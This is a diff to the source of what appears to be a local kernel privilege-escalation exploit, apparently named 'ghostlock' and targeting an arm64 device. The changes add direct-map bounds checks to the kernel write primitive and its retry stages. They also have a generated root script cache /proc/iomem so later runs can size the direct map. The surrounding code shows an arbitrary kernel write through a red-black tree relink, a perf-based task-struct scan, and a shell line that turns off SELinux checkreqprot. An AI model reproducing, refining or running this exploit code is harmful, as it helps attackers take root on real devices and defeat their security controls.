@@ -543,6 +543,91 @@ int run_main_route_threads(const WriteRequest *request) {
     return result;
 }
 
+/* A target outside the direct map is wrong by construction, so it is worth
+ * neither a spray nor a retry. */
+static int in_direct_map(uintptr_t target) {
+    return target > DIRECT_MAP_BASE && target < g_direct_map_end;
+}
+
+/* Lowest start and highest end of the System RAM banks in a /proc/iomem dump.
+ * A nested bank lies inside its parent, so it cannot widen either bound. */
+static int iomem_map_span(FILE *f, uint64_t *map_span) {
+    unsigned long long base = 0, top = 0;
+    char *line = NULL;
+    size_t cap = 0;
+    int found = 0;
+
+    while (getline(&line, &cap, f) > 0) {
+        size_t len = strlen(line);
+        unsigned long long a, b;
+        int used = 0;
+
+        while (len && (line[len - 1] == '\n' || line[len - 1] == '\r')) {
+            line[--len] = '\0';
+        }
+        /* %n pins the match to the whole line, since sscanf returns 2 even when
+         * a trailing literal mismatches */
+        if (sscanf(line, " %llx-%llx : System RAM%n", &a, &b, &used) == 2 &&
+                used == (int) len) {
+            if (!found || a < base) {
+                base = a;
+                found = 1;
+            }
+            if (b + 1 > top) top = b + 1;
+        }
+    }
+    free(line);
+
+    /* the map starts at the dram base the kernel rounded down to a gib, which
+     * is what memstart_addr holds */
+    base &= ~((1ULL << 30) - 1);
+    if (!found || top <= base) return 0;
+    *map_span = top - base;
+    return 1;
+}
+
+/* A rooted run leaves its /proc/iomem in the home dir, the only source for
+ * this unit's direct map size. */
+static void apply_iomem_cache(void) {
+    char path[320], stamp[192] = "";
+    uint64_t span = 0;
+    int ok = 0;
+    const struct kernel_offsets *values =
+            target_profile_values(&g_target_profile);
+    const char *release = values && values->uname_r ? values->uname_r : "";
+
+    snprintf(path, sizeof(path), "%s/.ghostlock_iomem", g_home_dir);
+    FILE *f = fopen(path, "r");
+    if (f) {
+        /* the first line names the release that wrote the dump */
+        if (fgets(stamp, sizeof(stamp), f)) {
+            stamp[strcspn(stamp, "\r\n")] = '\0';
+            ok = strncmp(stamp, "# ", 2) == 0 &&
+                 strcmp(stamp + 2, release) == 0 &&
+                 iomem_map_span(f, &span);
+        }
+        fclose(f);
+    }
+
+    /* the base is rounded down to a gib, so a span under that holds no real
+     * bank, and the span has to cover the dram the unit reports. it also
+     * stays inside the bound the built-in geometry already uses, so a measured
+     * end can only narrow what this build would otherwise trust. an
+     * unmeasurable ram rejects the dump */
+    long pages = sysconf(_SC_PHYS_PAGES), page_sz = sysconf(_SC_PAGE_SIZE);
+    uint64_t dram = (pages > 0 && page_sz > 0)
+                        ? (uint64_t) pages * (uint64_t) page_sz : 0;
+    if (!ok || !dram || span < (1ULL << 30) || span < dram ||
+            span >= DIRECT_MAP_END - DIRECT_MAP_BASE) {
+        pr_info("iomem cache: no usable dump, keeping the built-in geometry\n");
+        return;
+    }
+
+    g_direct_map_end = DIRECT_MAP_BASE + span;
+    pr_info("iomem cache: direct_map_end=%016llx\n",
+            (unsigned long long) g_direct_map_end);
+}
+
 /* Decoupling plan: prepare payload and execute one abstract kernel write.
  * Inputs: session and immutable WriteRequest; output: RouteStatus. Future:
  * exploit_execute_write(session, request), separating heap and route phases. */
@@ -550,6 +635,10 @@ static int do_one_write(const WriteRequest *request, const char *desc) {
     pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc,
             request->target, static_cast<int>(request->mode),
             !request->preserve_child);
+    if (!in_direct_map(request->target)) {
+        pr_warning("  target is outside the direct map, not writing\n");
+        return 0;
+    }
     /* Both transports write *(target) := value through the erase left-only
      * relink: waiter words are {pc = value, right = 0, left = target} and
      * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
@@ -698,6 +787,16 @@ static void write_root_script(void) {
             "if [ \"$(id -u)\" -ne 0 ]; then\n"
             "  echo '[!] temp su unavailable; aborting' >>\"$LOG\"\n"
             "  exit 1\n"
+            "fi\n"
+            /* the rename is atomic, so a failed read leaves the old dump in place */
+            "echo \"# $(uname -r)\" >\"$HOME_DIR/.ghostlock_iomem.new\"\n"
+            "if cat /proc/iomem >>\"$HOME_DIR/.ghostlock_iomem.new\" 2>/dev/null && grep -q 'System RAM' \"$HOME_DIR/.ghostlock_iomem.new\"; then\n"
+            "  mv \"$HOME_DIR/.ghostlock_iomem.new\" \"$HOME_DIR/.ghostlock_iomem\"\n"
+            "  chmod 644 \"$HOME_DIR/.ghostlock_iomem\" 2>/dev/null\n"
+            "  echo \"[*] iomem cache: cached $(wc -c <\"$HOME_DIR/.ghostlock_iomem\") bytes\" >>\"$LOG\"\n"
+            "else\n"
+            "  rm -f \"$HOME_DIR/.ghostlock_iomem.new\"\n"
+            "  echo '[!] iomem cache: /proc/iomem read failed' >>\"$LOG\"\n"
             "fi\n"
             "# W1's 64-bit child pointer makes adjacent booleans non-zero.\n"
             "echo 0 > /sys/fs/selinux/checkreqprot 2>/dev/null\n"
@@ -892,7 +991,7 @@ static uintptr_t perf_find_task(void) {
                     uint64_t v = regs[i];
                     /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
                     v |= 0x0fULL << 56;
-                    if (v > 0xffffff8000000000ULL && v < DIRECT_MAP_END)
+                    if (in_direct_map(v))
                         cands[nc++] = v;
                 }
             }
@@ -1121,6 +1220,13 @@ static int retry_write_stage(
         const char *stage, uintptr_t target, int mode, int attempts,
         useconds_t settle_usec, write_stage_verify_fn verify, void *context,
         int leaf) {
+    /* no attempt can move a target that is wrong by construction, and the
+     * stage belongs in the log with the address rather than the route */
+    if (!in_direct_map(target)) {
+        pr_warning("%s: target 0x%016zx is outside the direct map, not attempting\n",
+                stage, target);
+        return 0;
+    }
     const WriteRequest request = WriteRequest::make(
             target, static_cast<WriteMode>(mode), leaf != 0);
     for (int attempt = 1; attempt <= attempts; attempt++) {
@@ -1312,6 +1418,7 @@ int run_exploit(int argc, char **argv) {
             select_offsets(profile_path) < 0)
         return 1;
 
+    apply_iomem_cache();
     log_startup_context();
     init_p0_profile();
     pin_to_core(g_runtime_config.main_cpu);
